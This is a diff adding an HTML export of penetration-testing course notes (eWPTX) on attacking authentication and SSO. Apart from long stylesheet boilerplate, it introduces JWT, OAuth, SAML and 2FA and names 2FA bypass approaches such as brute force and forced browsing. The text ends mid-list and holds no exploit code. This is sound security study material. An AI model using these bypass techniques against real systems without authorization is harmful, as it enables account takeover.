@@ -1,0 +1,779 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Authentication &amp; SSO</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="cc2d9ae8-0613-4173-b868-fc7f5b4c0c6a" class="page mono"><header><h1 class="page-title"><strong>Authentication &amp; SSO</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="eb098e07-37f6-4d66-bb7d-5d119030ef72" class=""><strong>Attacking Authentication &amp; SSO</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#attacking-authentication--sso"></a></strong></h1><ul id="3a7310bf-45d5-4e75-bf0b-ee5367827dbb" class="bulleted-list"><li style="list-style-type:disc">Authentication in Web Apps</li></ul><ul id="8183423b-2692-4623-b132-c505ba337294" class="bulleted-list"><li style="list-style-type:disc">Attacking JWT</li></ul><ul id="e0f7c50e-26bd-481a-8a11-10b0739ed396" class="bulleted-list"><li style="list-style-type:disc">Attacking Oauth</li></ul><ul id="7fb13ad0-a741-4bb5-aaeb-6843bfbf9575" class="bulleted-list"><li style="list-style-type:disc">Attacking SAML</li></ul><ul id="995d36f8-cbe6-4e75-9086-1ca2b3eb43ef" class="bulleted-list"><li style="list-style-type:disc">Bypassing 2FA</li></ul><p id="a048212f-a0af-4f88-a5f8-17caa52554aa" class="">Objectives:</p><ul id="3c6e1833-60ed-4f77-bc26-4095428c6483" class="bulleted-list"><li style="list-style-type:disc">How to attack modern authentication and SSO implementations</li></ul><ul id="285b7363-b950-4b21-8ede-e46153ef23c0" class="bulleted-list"><li style="list-style-type:disc">The weak spots of JWT, SAML, OAth and 2FA</li></ul><h2 id="5b7d2565-1d62-475b-954e-2f8d302eaf6e" class=""><strong>Authentication in Web Apps</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#authentication-in-web-apps"></a></strong></h2><p id="c7d3aad2-f24f-4b7d-be52-848763668e71" class="">Its the process of utilizing a credential, known as an identity, to validate that the identify has permission to access the resource. In this case, the resource is the web application.</p><p id="46454f4a-e9e1-4e9c-97d8-7f993dfaca78" class="">We will focus on discussing authentication performed through a username/password combination, secret token (cookie), or a ping code</p><h3 id="bb3909b0-241d-4653-84ce-fd82fd99f618" class=""><strong>Some Features that web app uses</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#some-features-that-web-app-uses"></a></strong></h3><ul id="b4390b62-e66d-41ce-8e4a-96627aa25115" class="bulleted-list"><li style="list-style-type:disc">JSON Web Token (JWT) - A compact mechanism used For transfering claims between two parties</li></ul><ul id="ef597c0c-65de-42dd-80bc-a5182893864f" class="bulleted-list"><li style="list-style-type:disc">OAuth - Enables a third-party application to obtain limited access to an HTTP service, either on behalf of a resource owner by orchestrating an approval interaction between the resource owner and the hTTP service, or by allowing the third-party application to obtain access on its own behalf</li></ul><ul id="33449657-4e10-4c7a-8c47-18154f2be5bc" class="bulleted-list"><li style="list-style-type:disc">Security Assertion Markup Language (SAML) - An XML based single sign-on login standard</li></ul><p id="5d7de3ba-887c-4a26-ae8f-440d51badddf" class="">Moreover:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9d14a5cb-e727-47d6-af06-11725679c02f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://tools.ietf.org/html/rfc7519
+- https://tools.ietf.org/html/rfc6749
+- https://tools.ietf.org/html/rfc7522
+</code></pre><h3 id="4158a1de-f628-4950-a9d1-efd77a7bc518" class=""><strong>2FA</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#2fa"></a></strong></h3><p id="66c99794-9a35-4fff-a6be-6523ebc39b35" class="">Modern Web Apps also utilize an extra layer of defense when it comes to authentication, 2 factor authentication (2FA)</p><p id="fcc1226f-2688-401b-bbb4-73eac381ebc3" class="">Its a method to verify a users identity by utilizing a combination of two different factors:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a55ce705-818c-413f-a029-2741eacbc922" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Something you know (password)
+- Something you have (OTP)
+- Something you are  (biometric)
+</code></pre><h3 id="4105fc77-b30c-4618-bb5c-67e3554600b0" class=""><strong>2FA Bypasses</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#2fa-bypasses"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="933b8b5e-50b2-4048-9cb6-71bb5657434c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Brute Force (when a secret of limited length is utilized)
+- Less common interfaces (mobile app, XMLRPC, API instead of web)
+- Forced Browsing
+- Predictable/Reusable Tokens
+</code></pre><h2 id="776239e0-365e-4947-8b53-c1b745112f83" class=""><strong>JSON Web Tokens (JWT)</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#json-web-tokens-jwt"></a></strong></h2><p id="e1f5e8bd-e189-4b6b-880d-6257c7fcfad9" class="">According to the official JSON website (https://jwt.io/introduction/), a JWT consists of the following 3 piece in its structure:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d37f5545-7684-4c7a-8e54-83d98f9e602a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Header
+- Payload
+- Signature
+</code></pre><p id="0b8a9261-5d1e-4932-9401-eaa606d9edf1" class="">In a <strong>header</strong>, you will find the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="487eb9dc-dcb1-4d32-81c1-9f1523751df8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Type of the token
+- Signing algorithm
+</code></pre><blockquote id="d704b71d-f657-4cce-8846-be205c1ec599" class="">While in a payload u will find the claims</blockquote><h3 id="0e21a131-3e8a-4ed4-911a-21029a77b7a6" class=""><strong>The ‘signature’ consists of signing:</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#the-signature-consists-of-signing"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="79e54f96-f1d3-404c-beab-95649edb9543" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Encoded header
+- Encoded payload
+- A secret
+- Algorithm specified in the header
